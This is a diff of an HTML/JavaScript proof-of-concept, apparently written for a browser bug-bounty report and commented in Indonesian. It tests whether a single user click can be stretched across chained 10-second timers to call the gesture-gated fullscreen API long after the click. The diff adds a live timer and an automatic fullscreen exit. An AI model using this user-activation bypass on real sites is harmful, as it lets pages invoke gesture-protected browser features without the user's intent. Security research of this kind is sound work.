@@ -1,46 +1,77 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>VRP: Multi-Stage Gesture Laundering</title>
+    <title>VRP: Multi-Stage Gesture Laundering (Live Timer)</title>
     <style>
-        body { font-family: monospace; background: #000; color: #0f0; padding: 20px; }
-        #console { border: 1px solid #0f0; padding: 10px; height: 300px; overflow-y: auto; }
-        button { background: #0f0; color: #000; border: none; padding: 15px; cursor: pointer; font-weight: bold; }
+        body { font-family: 'Courier New', monospace; background: #050505; color: #00ff00; padding: 20px; }
+        #console { border: 1px solid #00ff00; padding: 15px; height: 350px; overflow-y: auto; background: #000; box-shadow: inset 0 0 10px #00ff00; }
+        #timer-box { font-size: 48px; font-weight: bold; color: #33ff33; margin-bottom: 20px; text-shadow: 0 0 10px #33ff33; }
+        button { background: #00ff00; color: #000; border: none; padding: 20px 40px; cursor: pointer; font-weight: bold; font-size: 18px; border-radius: 5px; }
+        button:hover { background: #33ff33; box-shadow: 0 0 20px #33ff33; }
+        .log-entry { margin-bottom: 5px; border-bottom: 1px solid #111; }
     </style>
 </head>
 <body>
     <h2>[RESEARCH] Gesture Activation Persistence</h2>
+    
+    <div id="timer-box">00:00:000</div>
+    
     <div id="console"></div><br>
+    
     <button id="start">INITIALIZE CHAIN (CLICK TO START)</button>
 
     <script>
         const btn = document.getElementById('start');
         const con = document.getElementById('console');
+        const timerBox = document.getElementById('timer-box');
         const T0 = () => performance.now();
         let startTime;
+        let timerInterval;
 
         function log(msg) {
             const ts = (T0() - startTime).toFixed(0);
-            con.innerHTML += `[${ts}ms] ${msg}<br>`;
+            con.innerHTML += `<div class="log-entry">[${ts}ms] ${msg}</div>`;
             con.scrollTop = con.scrollHeight;
         }
 
+        function updateTimer() {
+            const now = T0() - startTime;
+            const ms = Math.floor(now % 1000).toString().padStart(3, '0');
+            const sec = Math.floor((now / 1000) % 60).toString().padStart(2, '0');
+            const min = Math.floor(now / 60000).toString().padStart(2, '0');
+            timerBox.innerText = `${min}:${sec}:${ms}`;
+        }
+
         // --- KONFIGURASI TAHAPAN (STAGES) ---
-        // Kita pecah menjadi 10 detik per stage untuk mencapai 60 detik
-        const stages = [10000, 10000, 10000, 10000]; 
+        // Rekomendasi: Coba total 20 detik dulu (10s + 10s)
+        const stages = [10000, 10000, 10000]; 
 
         function executeStage(index) {
             if (index >= stages.length) {
-                log("<b>FINAL STAGE REACHED.</b> Invoking sensitive API...");
+                log("<b style='color:white'>FINAL STAGE REACHED.</b> Invoking sensitive API...");
+                
                 document.documentElement.requestFullscreen()
-                    .then(() => log("<span style='color:cyan'>SUCCESS: GESTURE LAUNDERED (60s+)</span>"))
-                    .catch(e => log("<span style='color:red'>EXPIRED: " + e.message + "</span>"));
+                    .then(() => {
+                        log("<span style='color:cyan; font-size: 1.2em;'>SUCCESS: GESTURE LAUNDERED!</span>");
+                        clearInterval(timerInterval);
+                        
+                        // Otomatis keluar fullscreen setelah 3 detik biar kelihatan dinamis
+                        setTimeout(() => {
+                            if (document.fullscreenElement) {
+                                document.exitFullscreen();
+                                log("Test completed. Exit Fullscreen.");
+                            }
+                        }, 3000);
+                    })
+                    .catch(e => {
+                        log("<span style='color:red'>EXPIRED: " + e.message + "</span>");
+                        clearInterval(timerInterval);
+                    });
                 return;
             }
 
             log(`Stage ${index + 1}/${stages.length}: Nesting ${stages[index]}ms task...`);
             
-            // Kuncinya: Task baru dibuat hanya setelah task sebelumnya selesai
             setTimeout(() => {
                 executeStage(index + 1);
             }, stages[index]);
@@ -50,6 +81,8 @@
             startTime = T0();
             btn.style.display = 'none';
             log("User gesture captured. Starting chain...");
+            
+            timerInterval = setInterval(updateTimer, 10);
             executeStage(0);
         };
     </script>
